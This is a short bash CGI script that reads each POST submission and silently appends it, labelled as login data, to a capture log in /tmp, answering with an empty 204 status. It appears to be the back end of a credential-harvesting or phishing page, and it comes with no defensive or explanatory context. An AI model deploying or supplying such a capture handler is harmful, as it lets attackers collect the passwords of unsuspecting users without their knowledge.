#!/bin/bash
echo "Status: 204 No Content"
echo "Content-type: text/plain"
echo ""

# Read POST data
read -n $CONTENT_LENGTH POST_DATA

# Log to server only
echo "[LOGIN DATA] $(date): $POST_DATA" >> /tmp/login_capture.log
